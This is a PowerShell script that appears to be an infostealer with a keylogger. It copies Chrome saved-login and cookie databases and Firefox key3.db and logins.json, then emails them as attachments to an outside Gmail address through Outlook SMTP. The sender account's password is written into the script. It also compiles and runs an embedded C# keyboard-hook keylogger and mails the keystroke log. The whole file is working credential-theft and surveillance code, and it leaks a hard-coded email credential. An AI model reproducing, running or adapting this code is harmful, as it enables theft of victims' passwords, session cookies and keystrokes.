$username=$env:Username

$From = "novicehckr@outlook.com"
$Pass = "IMMrr1aN"
$To = "9844417@gmail.com"
$Subject = "Browser password"
$Body = $username
$SMTPServer = "smtp.outlook.com"
$SMTPPort = "587"
$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)


$path1=$path2=$path3=$path4=0
if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Default\Login` Data)
{
	$chromeD="C:\Users\"+$username+"\AppData\Local\Google\Chrome\User Data\Default\Login Data";
	$path1=1
	copy-item -path $chromeD -destination D:/
	Rename-Item D:\Login` Data Login Data
	$Attachment1 = "D:\Login Data"
	
}


if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Profile` 1\Login` Data)
{
	$chrome1="C:\Users\"+$username+"\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data"
	$path2=1
	copy-item -path $chrome1 -destination E:/
	Rename-Item E:\Login` Data ProfileLogin1
	$Attachment2 = "E:\ProfileLogin1"
}


if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Default\Cookies)
{
	$chrome3="C:\Users\"+$username+"\AppData\Local\Google\Chrome\User Data\Default\Cookies"
	$path3=1
	copy-item -path $chrome3 -destination D:/
	Rename-Item D:\Cookies Cookies
	$Attachment3 = "D:\Cookies"
}

if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Profile` 1\Cookies)
{
	$chrome3="C:\Users\"+$username+"\AppData\Local\Google\Chrome\User Data\Profile 1\Cookies"
	$path4=1
	copy-item -path $chrome3 -destination E:/
	Rename-Item E:\Cookies Cookies1
	$Attachment4 = "E:\Cookies1"
}



if($path1=1)
{
Send-MailMessage -From $From -to $To -Subject $Subject `
-Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
-Credential $credentials -Attachments $Attachment1
Remove-Item D:\Login Data

}

if($path2=1)
{
Send-MailMessage -From $From -to $To -Subject $Subject `
-Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
-Credential $credentials -Attachments $Attachment2
Remove-Item E:\ProfileLogin1

}

if($path3=1)
{
Send-MailMessage -From $From -to $To -Subject $Subject `
-Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
-Credential $credentials -Attachments $Attachment3
Remove-Item D:\Cookies

}

if($path4=1)
{
Send-MailMessage -From $From -to $To -Subject $Subject `
-Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
-Credential $credentials -Attachments $Attachment4
Remove-Item E:\Cookies1

}
 


$MPath="C:\Users\"+$username+"\AppData\Local\Mozilla\Firefox\Profiles"
if(Test-Path $MPath)
{

$profile=get-childitem $Mpath | where {$_.extension -eq '.default'}
$kpath= $Mpath + "\" + $profile.name+"\key3.db"
$lpath= $Mpath + "\" + $profile.name+"\logins.json"
if (Test-Path $kpath)
{

Send-MailMessage -From $From -to $To -Subject $Subject `
-Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
-Credential $credentials -Attachments $kpath

}
if (Test-Path $lpath)
{

Send-MailMessage -From $From -to $To -Subject $Subject `
-Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
-Credential $credentials -Attachments $lpath

}
Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KeyLogger {
  public static class Program {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;

    private const string logFileName = "D:\log.txt";
    private static StreamWriter logFile;

    private static HookProc hookProc = HookCallback;
    private static IntPtr hookId = IntPtr.Zero;

    public static void Main() {
      logFile = File.AppendText(logFileName);
      logFile.AutoFlush = true;

      hookId = SetHook(hookProc);
      Application.Run();
      UnhookWindowsHookEx(hookId);
    }

    private static IntPtr SetHook(HookProc hookProc) {
      IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
      return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
    }

    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
      if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
        int vkCode = Marshal.ReadInt32(lParam);
        logFile.WriteLine((Keys)vkCode);
      }

      return CallNextHookEx(hookId, nCode, wParam, lParam);
    }

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
  }
}
"@ -ReferencedAssemblies System.Windows.Forms

[KeyLogger.Program]::Main();	
}

copy-item -path "./log.txt" -destination D:/
$AttachmentLog = "D:\log.txt"
Send-MailMessage -From $From -to $To -Subject $Subject `
-Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
-Credential $credentials -Attachments $AttachmentLog
Remove-Item D:\log.txt
